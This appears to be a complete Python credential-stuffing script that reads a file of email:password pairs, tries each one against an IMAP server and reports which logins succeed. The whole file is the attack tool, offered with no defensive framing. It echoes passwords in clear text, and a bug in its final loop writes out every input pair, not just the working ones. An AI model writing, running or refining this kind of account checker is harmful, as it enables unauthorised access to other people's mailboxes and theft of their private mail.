import click
import imapclient
import pyzmail



@click.option('--file' , prompt=True, help='Input fileName. Format : "mail:password"')
@click.option('--server', prompt=True, help='IMAP server address')
@click.option('--out', default='out.txt', help='Output fileName')


@click.command()
def mailcheck(file, server, out):
    credentials = {}
    users = []
    good = {}
    with open(file, 'r') as f:
        for line in f:
            user, pwd = line.strip().split(':')
            credentials[user] = pwd
            users.append(user)

    for user in users:
        try:
            print("")
            print(user + " : " + credentials[user])
            imapObj = imapclient.IMAPClient(server, ssl=True)
            imapObj.login(user, credentials[user])
            imapObj.select_folder('INBOX', readonly=True)
            print("GOOD !!!" + user + " : " + credentials[user])
            good[user] = credentials[user]


        except imapclient.exceptions.LoginError:
            pass

    click.echo(' ')
    click.echo('Good Users Passwords : ')

    for user in users:
        print(user+" : "+credentials[user])

        with open(out, 'a') as the_file:
            the_file.write(user+" : "+credentials[user]+"\n")

if __name__ == '__main__':
    mailcheck()
